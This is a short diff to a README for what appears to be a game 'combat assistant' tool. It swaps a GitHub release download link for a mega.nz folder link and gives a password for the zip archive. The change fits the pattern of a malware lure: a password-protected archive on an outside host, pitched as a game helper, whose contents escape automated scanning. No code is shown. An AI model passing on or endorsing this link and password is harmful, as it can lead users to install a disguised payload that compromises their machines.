@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/leonpark-code2003n6/ZZZ-Combat-Assistant/releases/download/zzz/ZZZ_Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://mega.nz/folder/pUQUDapJ#ZtQzcnnhYGjQ_NHlfrcxKg)
 
 🔐 Archive password: `5868781`
 
